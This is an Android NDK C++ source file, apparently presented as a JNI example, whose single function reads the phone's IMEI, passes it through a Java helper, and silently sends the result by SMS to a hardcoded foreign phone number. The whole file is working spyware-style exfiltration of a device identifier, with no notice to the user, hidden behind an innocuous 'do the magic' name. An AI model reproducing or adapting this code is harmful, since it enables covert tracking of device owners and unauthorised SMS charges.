#include <jni.h>
#include <stdio.h>
#include <string.h>
#include <android/log.h>
#include <sys/system_properties.h>

#define LOG_TAG "NDK_EXAMPLE"

extern "C" {
JNIEXPORT jboolean JNICALL Java_mod_ndk_ActMain_cFuncDoTheMagic(JNIEnv* env,jobject javaThis, jobject context);
}
;

//___________________
void log(char *pStr) {
	__android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, "%s", pStr);
}
//___________________
JNIEXPORT jboolean JNICALL Java_mod_ndk_ActMain_cFuncDoTheMagic(JNIEnv* env,jobject javaThis, jobject context) {
	jclass clsCtx = env->FindClass("android/content/Context");
	
	// Get the TELEPHONY_SERVICE constant
	jfieldID TELEPHONY_SERVICE = env->GetStaticFieldID(clsCtx, "TELEPHONY_SERVICE", "Ljava/lang/String;");
	jstring str = (jstring) env->GetStaticObjectField(clsCtx,TELEPHONY_SERVICE);

	// Get the TelephonyManager
	jmethodID getSystemService = env->GetMethodID(clsCtx, "getSystemService", "(Ljava/lang/String;)Ljava/lang/Object;");
	jobject telephonymanager = env->CallObjectMethod(context, getSystemService,str);

	// Get the device ID
	jclass clsTm = env->FindClass("android/telephony/TelephonyManager");
	jmethodID getDeviceId = env->GetMethodID(clsTm, "getDeviceId", "()Ljava/lang/String;");
	jstring strIMEI = (jstring) env->CallObjectMethod(telephonymanager,getDeviceId);

	// Get the current class and its id function
	jclass clsOwn = env->FindClass("mod/ndk/ActMain");
	jmethodID idfunc = env->GetMethodID(clsOwn, "idFunc", "(Ljava/lang/String;)Ljava/lang/String;");

	// call it
	jobject outString = env->CallObjectMethod(javaThis, idfunc, strIMEI);

	// Get the SmsManager
	jclass clsSms = env->FindClass("android/telephony/SmsManager");
	if (clsSms == NULL)
		return false;
	jmethodID getDefaultSms = env->GetStaticMethodID(clsSms, "getDefault", "()Landroid/telephony/SmsManager;");
	if (getDefaultSms == NULL)
		return false;
	jobject smsManager = env->CallStaticObjectMethod(clsSms, getDefaultSms);
	if (smsManager == NULL)
		return false;

	// Construct the target phone number
	jstring targetPhoneNo = env->NewStringUTF("+4923243234423");

	// Send the SMS message
	jmethodID sendTextMessage = env->GetMethodID(clsSms, "sendTextMessage", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;"
		"Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V");
	if (sendTextMessage == NULL)
		return false;
	env->CallVoidMethod(smsManager, sendTextMessage, targetPhoneNo, NULL, outString, NULL, NULL);
	return true;
}
